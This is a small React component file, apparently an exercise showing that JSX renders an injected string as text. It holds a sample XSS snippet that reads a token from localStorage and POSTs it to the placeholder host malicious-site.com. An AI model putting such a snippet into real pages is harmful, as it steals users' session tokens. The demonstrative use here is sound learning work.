const maliciousScript = `
    <script>
        const token = window.localStorage.getItem('token');
        fetch('http://malicious-site.com/get-token', {
            method: 'POST',
            body: { token }
        })
        console.log('sent')
    </script>
`

export default function HelloWorld() {
    const name = 'Renato'
    const title = <h1>Hello, {name}!</h1>
    const index = 0

    if (name === 'Renato') {
        return <div>
            <h1 tabIndex={ index } style={{ background: 'red' }}>{ maliciousScript }</h1>
        </div>
    }

    return <div>
        <h1>Hello, { name === 'Renato' ? 'Henrique' : name }!!</h1>
    </div>

    //return <div>
    //    { title }
    //</div>
}